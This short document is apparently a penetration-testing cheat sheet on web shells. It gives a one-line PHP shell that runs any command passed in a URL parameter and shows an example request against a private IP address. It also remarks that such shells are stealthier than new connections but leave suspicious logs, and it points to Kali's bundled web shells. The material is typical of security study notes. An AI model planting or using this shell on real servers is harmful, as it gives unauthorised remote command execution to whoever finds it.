# Webshell

## Basic cmd-shell

This code can be injected into pages that use php.
```
<?php system($_GET['cmd']); ?>
```

You can then call then execute the commands like this:

```
http://192.168.1.103/index.php?cmd=pwd
```

## Webshells

Wellshells have the benefit of running on port 80/443. Which makes it a bit more stealthy, it doesn't create a new connection that can be discovered. But on the other hand it creates a lot of strange logs that can be easy to detect.

You have access to different kinds of webshells on Kali here:
```
/usr/share/webshells
```

http://www.binarytides.com/web-shells-tutorial/
